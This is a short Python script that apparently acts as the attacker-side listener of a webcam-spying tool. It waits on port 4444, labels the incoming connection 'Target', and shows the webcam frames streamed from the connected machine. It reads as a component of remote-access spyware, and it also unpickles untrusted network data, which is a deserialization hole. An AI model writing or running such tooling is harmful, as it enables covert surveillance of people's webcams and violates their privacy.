import socket
import cv2
import pickle
import struct

server_ip = 'YOUR_IP'
server_port = 4444

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((server_ip, server_port))
server_socket.listen(10)

print("Wait...")

connection, address = server_socket.accept()
print("Target:", address)

data = b""
payload_size = struct.calcsize("L")

while True:
    while len(data) < payload_size:
        data += connection.recv(4096)

    packed_msg_size = data[:payload_size]
    data = data[payload_size:]
    msg_size = struct.unpack("L", packed_msg_size)[0]

    while len(data) < msg_size:
        data += connection.recv(4096)

    frame_data = data[:msg_size]
    data = data[msg_size:]

    frame = pickle.loads(frame_data)

    cv2.imshow('Webcam', frame)
    cv2.waitKey(1)

connection.close()
server_socket.close()
cv2.destroyAllWindows()
